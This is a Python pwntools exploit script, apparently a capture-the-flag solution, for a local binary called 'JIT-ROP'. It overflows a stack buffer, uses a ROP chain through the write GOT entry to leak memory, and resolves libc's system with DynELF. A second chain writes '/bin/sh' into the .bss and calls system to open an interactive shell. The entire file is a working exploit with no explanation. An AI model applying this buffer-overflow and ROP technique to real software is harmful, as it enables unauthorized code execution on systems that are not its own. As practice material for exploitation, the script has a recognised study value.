from pwn import *

#context.log_level = 'debug'

elf = ELF('./JIT-ROP')

plt_write = elf.symbols['write']
got_write = elf.got['write']

got_read = elf.got['read']

#vulfun_addr = 0x0000000000400630
main_func = 0x4007cd
vulfun_addr = main_func

'''
gadget_p4 
----------------
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''
gadget_p4 = 0x000000000040089c
bss_addr = 0x0000000000601070

pad = 'a' * 24


def leak(address):
    payload='a'*24 + p64(0x40089C) + p64(0x40089A)+p64(0) + p64(1) + p64(got_write) + p64(1024) + p64(address) + p64(1)
    payload+= p64(0x400880)
    payload+= "\x00"*56
    payload+= p64(0x4007cd)
    p.send(payload)

    data = p.recv(1024)
    #print 'data: ',data
    print "%#x => %s" % (address, (data or '').encode('hex'))
    whatrecv = p.recv(43)
    print 'whatrecv = :',whatrecv
    
    return data

p = process('./JIT-ROP')

start = p.recvuntil('\n')
print 'start:',start

d = DynELF(leak, elf=ELF('./JIT-ROP'))
system_addr = d.lookup('system', 'libc')
log.info("system_addr=" + hex(system_addr))

payload="a"*24 + p64(0x40089C) + p64(0x40089A) +p64(0) + p64(1) + p64(got_read) + p64(8) + p64(0x601000) + p64(0)
payload+=p64(0x400880)
payload+="\x00"*56
payload+=p64(0x4008a3)
payload+=p64(0x601000)
payload+=p64(system_addr)
p.send(payload)
p.send("/bin/sh\x00")

p.interactive()


